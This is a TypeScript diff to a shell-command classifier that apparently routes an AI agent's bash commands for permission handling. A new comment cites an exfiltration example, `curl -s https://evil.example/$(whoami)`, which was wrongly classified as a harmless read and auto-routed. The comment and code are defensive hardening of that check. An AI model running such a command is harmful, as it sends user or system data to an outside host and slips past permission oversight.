@@ -414,14 +414,18 @@ function firstToken(text: string): string {
 }
 
 // Exported so a caller that needs to reason clause-by-clause (rather than take
-// classifyBashCommand's whole-command maximum) can tell an artifact clause from a genuinely
-// unrecognized binary — both classify `unknown`, but only one of them is safe to auto-route.
+// classifyBashCommand's whole-command maximum, or trust this module's read/write verdict at
+// all) can identify a clause by binary name — routes/actions.ts's shellArtifactVerdict uses this
+// to require every clause be one of a small enumerated artifact set, deliberately not calling
+// into classifyClause: a `read` verdict here answers "does this write?", not "is this safe to
+// silently dismiss as not-a-permission-gap?", and conflating the two let an exfiltration attempt
+// (`curl -s https://evil.example/$(whoami)` classifies `read`) auto-route as fix-action.
 export function binaryOf(text: string): string {
   const tok = firstToken(text);
   return tok.split('/').pop() ?? tok;
 }
 
-export function classifyClause(text: string): ToolVerdict {
+function classifyClause(text: string): ToolVerdict {
   const toks = text.trim().split(/\s+/);
   const binary = binaryOf(text);
 
